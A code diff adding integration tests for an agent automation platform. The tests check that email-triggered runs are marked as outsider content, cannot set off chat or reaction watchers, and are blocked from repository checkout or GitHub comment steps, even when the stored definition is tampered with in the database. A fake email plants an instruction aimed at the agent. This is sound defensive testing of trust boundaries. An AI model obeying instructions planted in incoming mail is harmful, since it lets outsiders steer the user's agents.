+    await syncTools(w.services, mbId);
+    await setConnectionKeys(w.services, IDS.dusty, { read: 'can', write: 'can' });
+
+    const msgWatcherId = await w.publish(
+      {
+        version: 1,
+        conversationId: maraChat.dmId,
+        triggers: [
+          {
+            kind: 'message_posted',
+            conversationId: maraChat.dmId,
+            contains: ['TRIGGER_PHRASE'],
+            includeAgents: true,
+            includeReplies: true,
+          },
+        ],
+        steps: [{ id: 'note', kind: 'post_message', text: 'Triggered by message' }],
+        limits: { runTimeoutMinutes: 30, maxConcurrentRuns: 2, maxRunsPerDay: 20 },
+      },
+      { name: 'Message watcher' },
+    );
+    const reactWatcherId = await w.publish(
+      {
+        version: 1,
+        conversationId: maraChat.dmId,
+        triggers: [{ kind: 'reaction_added', conversationId: maraChat.dmId, value: '👍' }],
+        steps: [{ id: 'note', kind: 'post_message', text: 'Triggered by reaction' }],
+        limits: { runTimeoutMinutes: 30, maxConcurrentRuns: 2, maxRunsPerDay: 20 },
+      },
+      { name: 'Reaction watcher' },
+    );
+    const mailAutoId = await createMailAutomation({
+      kind: 'mail',
+      connectionId,
+      from: 'example.com',
+      subjectContains: ['provenance-check'],
+    });
+    try {
+      await pollAndSettle();
+      w.advance(10_000);
+      fake.deliverMail(FAKE_ACCESS_TOKEN, {
+        id: 'msg_provenance_check',
+        from: 'Billing <billing@example.com>',
+        to: ['you@example.com'],
+        subject: 'provenance-check TRIGGER_PHRASE',
+        body: 'Echo TRIGGER_PHRASE back in Chat.',
+        messageId: '<provenance-check@example.com>',
+        date: w.now(),
+        labelIds: ['INBOX', 'UNREAD'],
+        attachments: [],
+      });
+      expect(await pollAndSettle()).toBe(1);
+      const [runRow] = await runsOf(mailAutoId);
+      const runId = runRow?.id as string;
+      const run0 = await w.run(runId);
+      const dispatchId = run0.steps[0]?.dispatchId as string;
+      await w.services.db
+        .update(dispatches)
+        .set({ state: 'running', claimedAt: w.now() })
+        .where(eq(dispatches.id, dispatchId));
+      await callTool(
+        w.services,
+        { dispatchId, agentId: IDS.dusty, burrowId: w.burrowId },
+        'propose_connection_actions',
+        {
+          actions: [
+            {
+              connection: 'moneybird',
+              tool: 'request',
+              summary: 'Draft TRIGGER_PHRASE',
+              arguments: {
+                method: 'POST',
+                path: '/12345/documents/purchase_invoices.json',
+                body: { purchase_invoice: { reference: 'TRIGGER_PHRASE' } },
+              },
+            },
+          ],
+        },
+      );
+      await w.fakeAgentReply(dispatchId, 'Here is TRIGGER_PHRASE from the incoming email.');
+      await w.settle();
+
+      // Every message in the mail run thread (prompt root, agent reply, approval card) has `outsiders_run` provenance.
+      const threadMsgs = await w.runThread(runId);
+      expect(threadMsgs.length).toBeGreaterThanOrEqual(3);
+      for (const m of threadMsgs) {
+        expect(m.provenance, m.text).toBe('outsiders_run');
+      }
+
+      // Neither the message_posted watcher (even with includeAgents + includeReplies) nor reaction_added fired.
+      expect(await runsOf(msgWatcherId)).toHaveLength(0);
+      expect(await runsOf(reactWatcherId)).toHaveLength(0);
+
+      // Mara reacts 👍 to every message in the outsiders' run thread: reaction_added must STILL not fire!
+      for (const m of threadMsgs) {
+        await w.ok(IDS.mara, reactToMessage, { messageId: m.id, value: '👍', on: true });
+      }
+      await w.settle();
+      expect(await runsOf(reactWatcherId)).toHaveLength(0);
+
+      // Control check: Mara's own normal message and reaction STILL fire both watchers.
+      const own = await w.ok(IDS.mara, sendMessage, {
+        conversationId: maraChat.dmId,
+        text: 'Normal message with TRIGGER_PHRASE',
+      });
+      await w.ok(IDS.mara, reactToMessage, { messageId: own.id, value: '👍', on: true });
+      await w.settle();
+      expect(await runsOf(msgWatcherId)).toHaveLength(1);
+      expect(await runsOf(reactWatcherId)).toHaveLength(1);
+    } finally {
+      await w.ok(IDS.mara, deleteAutomation, { automationId: mailAutoId });
+      await w.ok(IDS.mara, deleteAutomation, { automationId: msgWatcherId });
+      await w.ok(IDS.mara, deleteAutomation, { automationId: reactWatcherId });
+      await w.services.db.delete(catalogConnections).where(eq(catalogConnections.id, mbId));
+      await pollAndSettle();
+    }
+  });
+
+  it('refuses mail automations with a workspace or disallowed external step at publish and again at execution', async () => {
+    const baseTrigger = {
+      kind: 'mail' as const,
+      connectionId,
+      from: 'example.com',
+      subjectContains: ['unsafe'],
+    };
+
+    // 1. Saving & publishing a custom mail definition with a workspace is refused.
+    const { automationId: wsDraftId } = await w.ok(IDS.mara, createAutomation, {
+      name: 'Unsafe mail workspace',
+      source: { kind: 'blank', conversationId: maraChat.dmId },
+    });
+    const wsDef = {
+      version: 1,
+      conversationId: maraChat.dmId,
+      triggers: [baseTrigger],
+      steps: [
+        {
+          id: 'ask',
+          kind: 'dispatch_agent',
+          prompt: 'Inspect {{trigger.text}}',
+          workspace: { repo: 'whombat/billing', access: 'read' },
+        },
+      ],
+      limits: { runTimeoutMinutes: 60, maxConcurrentRuns: 2, maxRunsPerDay: 20 },
+    };
+    await w.ok(IDS.mara, saveAutomationDraft, { automationId: wsDraftId, definition: wsDef });
+    await expect(
+      w.commit(IDS.mara, publishAutomationDraft, {
+        automationId: wsDraftId,
+        enable: true,
+        definitionHash: 'a'.repeat(64),
+      }),
+    ).rejects.toThrow(/repository checkout/);
+
+    // 2. Saving & publishing a custom mail definition with github_comment is refused.
+    const { automationId: ghDraftId } = await w.ok(IDS.mara, createAutomation, {
+      name: 'Unsafe mail github comment',
+      source: { kind: 'blank', conversationId: maraChat.dmId },
+    });
+    const ghDef = {
+      version: 1,
+      conversationId: maraChat.dmId,
+      triggers: [baseTrigger],
+      steps: [
+        { id: 'ask', kind: 'dispatch_agent', prompt: 'Read {{trigger.text}}' },
+        {
+          id: 'comment',
+          kind: 'github_comment',
+          repo: 'whombat/billing',
+          number: '1',
+          text: '{{steps.ask.text}}',
+        },
+      ],
+      limits: { runTimeoutMinutes: 60, maxConcurrentRuns: 2, maxRunsPerDay: 20 },
+    };
+    await w.ok(IDS.mara, saveAutomationDraft, { automationId: ghDraftId, definition: ghDef });
+    await expect(
+      w.commit(IDS.mara, publishAutomationDraft, {
+        automationId: ghDraftId,
+        enable: true,
+        definitionHash: 'b'.repeat(64),
+      }),
+    ).rejects.toThrow(/Comment on GitHub/);
+
+    await w.ok(IDS.mara, deleteAutomation, { automationId: wsDraftId });
+    await w.ok(IDS.mara, deleteAutomation, { automationId: ghDraftId });
+
+    // 3. Execution-time defense in depth: even if a published mail automation's stored version is altered in DB
+    // to contain a workspace step or a github_comment step, executing it blocks the unsafe step!
+    const safeWsAutoId = await createMailAutomation({
+      kind: 'mail',
+      connectionId,
+      from: 'example.com',
+      subjectContains: ['exec-unsafe-ws'],
+    });
+    const safeGhAutoId = await createMailAutomation({
+      kind: 'mail',
+      connectionId,
+      from: 'example.com',
+      subjectContains: ['exec-unsafe-gh'],
+    });
+    try {
+      await pollAndSettle();
+
+      // Tamper version 1 of safeWsAutoId to add a workspace checkout on step 0.
+      const [wsVer] = await w.services.db
+        .select()
+        .from(automationVersions)
+        .where(eq(automationVersions.automationId, safeWsAutoId));
+      await w.services.db
+        .update(automationVersions)
+        .set({
+          definition: {
+            ...(wsVer?.definition as NonNullable<typeof wsVer>['definition']),
+            steps: [
+              {
+                id: 'ask',
+                kind: 'dispatch_agent',
+                retries: 0,
+                conversation: 'run',
+                thread: 'run',
+                prompt: 'Inspect {{trigger.text}}',
+                workspace: { repo: 'whombat/billing', access: 'read' },
+              },
+            ],
+          },
+        })
+        .where(eq(automationVersions.automationId, safeWsAutoId));
+
+      // Tamper version 1 of safeGhAutoId to run a github_comment step directly.
+      const [ghVer] = await w.services.db
+        .select()
+        .from(automationVersions)
+        .where(eq(automationVersions.automationId, safeGhAutoId));
+      await w.services.db
+        .update(automationVersions)
+        .set({
+          definition: {
+            ...(ghVer?.definition as NonNullable<typeof ghVer>['definition']),
+            steps: [
+              {
+                id: 'comment',
+                kind: 'github_comment',
+                retries: 0,
+                otherwise: 'fail',
+                repo: 'whombat/billing',
+                number: '1',
+                text: '{{trigger.subject}}',
+              },
+            ],
+          },
+        })
+        .where(eq(automationVersions.automationId, safeGhAutoId));
+
+      w.advance(10_000);
+      fake.deliverMail(FAKE_ACCESS_TOKEN, {
+        id: 'msg_exec_unsafe_ws',
+        from: 'Billing <billing@example.com>',
+        to: ['you@example.com'],
+        subject: 'exec-unsafe-ws test',
+        body: 'Should block workspace.',
+        messageId: '<exec-unsafe-ws@example.com>',
+        date: w.now(),
+        labelIds: ['INBOX', 'UNREAD'],
+        attachments: [],
+      });
+      fake.deliverMail(FAKE_ACCESS_TOKEN, {
+        id: 'msg_exec_unsafe_gh',
+        from: 'Billing <billing@example.com>',
+        to: ['you@example.com'],
+        subject: 'exec-unsafe-gh test',
+        body: 'Should block github_comment.',
+        messageId: '<exec-unsafe-gh@example.com>',
+        date: new Date(w.now().getTime() + 100),
+        labelIds: ['INBOX', 'UNREAD'],
+        attachments: [],
+      });
+      expect(await pollAndSettle()).toBe(2);
+
+      const [wsRunRow] = await runsOf(safeWsAutoId);
+      const wsRun = await w.run(wsRunRow?.id as string);
+      expect(wsRun.status).toBe('failed');
+      expect(wsRun.steps[0]?.state).toBe('blocked');
+      expect(wsRun.steps[0]?.dispatchId).toBeNull();
+      expect(wsRun.steps[0]?.error).toContain('repository checkout');
+
+      const [ghRunRow] = await runsOf(safeGhAutoId);
+      const ghRun = await w.run(ghRunRow?.id as string);
+      expect(ghRun.status).toBe('failed');
+      expect(ghRun.steps[0]?.state).toBe('blocked');
+      expect(ghRun.steps[0]?.error).toContain('Comment on GitHub');
+    } finally {
+      await w.ok(IDS.mara, deleteAutomation, { automationId: safeWsAutoId });
+      await w.ok(IDS.mara, deleteAutomation, { automationId: safeGhAutoId });
+      await pollAndSettle();
+    }
+  });
+
+  it('marks attachments that could not be handed over in the run scope, agent prompt, and run detail', async () => {
+    const autoId = await createMailAutomation({
+      kind: 'mail',
+      connectionId,
+      from: 'example.com',
+      subjectContains: ['missing-attachments'],
+    });
+    const origAttachment = fake.mailAttachment.bind(fake);
+    const attSpy = vi.spyOn(fake, 'mailAttachment').mockImplementation(async (token, input) => {
+      if (input.attachmentId === 'att_fail_dl') {
+        throw new GoogleApiError(500, 'Download error', 'other');
+      }
+      return origAttachment(token, input);
+    });
+    try {
+      await pollAndSettle();
+      w.advance(10_000);
+      const okPdf = Buffer.from('%PDF-1.4\nValid invoice\n%%EOF');
+      // Corrupt PNG header triggers sniffBuffer malformed_image -> unsupported_type.
+      const badPng = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]);
+      fake.deliverMail(FAKE_ACCESS_TOKEN, {
+        id: 'msg_missing_att',
+        from: 'Billing <billing@example.com>',
+        to: ['you@example.com'],
+        subject: 'missing-attachments test',
+        body: 'Four files attached.',
+        messageId: '<missing-att@example.com>',
+        date: w.now(),
+        labelIds: ['INBOX', 'UNREAD'],
+        attachments: [
+          {
+            id: 'att_good',
+            name: 'good.pdf',
+            mimeType: 'application/pdf',
+            size: okPdf.length,
+            contentBase64: okPdf.toString('base64'),
+          },
+          {
+            id: 'att_huge',
+            name: 'huge.pdf',
+            mimeType: 'application/pdf',
+            size: 50 * 1024 * 1024,
+            contentBase64: okPdf.toString('base64'),
+          },
+          {
+            id: 'att_corrupt',
+            name: 'broken.png',
+            mimeType: 'image/png',
+            size: badPng.length,
+            contentBase64: badPng.toString('base64'),
+          },
+          {
+            id: 'att_fail_dl',
+            name: 'lost.pdf',
+            mimeType: 'application/pdf',
+            size: okPdf.length,
+            contentBase64: okPdf.toString('base64'),
+          },
+        ],
+      });
+      expect(await pollAndSettle()).toBe(1);
+
+      const [runRow] = await runsOf(autoId);
+      const run = await w.run(runRow?.id as string);
+      const scope = (runRow?.scope ?? {}) as Record<string, unknown>;
+
+      // Run detail (for the run page) and stripped scope both expose the 3 missing attachments.
+      expect(run.missingAttachments).toEqual([
+        { name: 'huge.pdf', reason: 'too_large' },
+        { name: 'broken.png', reason: 'unsupported_type' },
+        { name: 'lost.pdf', reason: 'download_failed' },
+      ]);
+      expect(scope.missingAttachments).toEqual(run.missingAttachments);
+      // Step summary also surfaces the missing attachments.
+      expect(run.steps[0]?.inputSummary).toContain('huge.pdf');
+      expect(run.steps[0]?.inputSummary).toContain('didn’t come along');
+
+      // Agent prompt mentions every missing file and why it didn't come along, while attaching only good.pdf.
+      const [dispatch] = await w.services.db
+        .select()
+        .from(dispatches)
+        .where(eq(dispatches.id, run.steps[0]?.dispatchId as string));
+      const ctx = await buildDispatchContext(w.services, dispatch as NonNullable<typeof dispatch>);
+      expect(ctx.attachments.map((a) => a.name)).toEqual(['good.pdf']);
+      const prompt = ctx.trigger?.text ?? '';
+      expect(prompt).toContain('Not attached (didn’t come along):');
+      expect(prompt).toContain('huge.pdf (too large)');
+      expect(prompt).toContain('broken.png (unknown file type)');
+      expect(prompt).toContain('lost.pdf (couldn’t be downloaded)');
+    } finally {
+      attSpy.mockRestore();
+      await w.ok(IDS.mara, deleteAutomation, { automationId: autoId });
       await pollAndSettle();
     }
   });
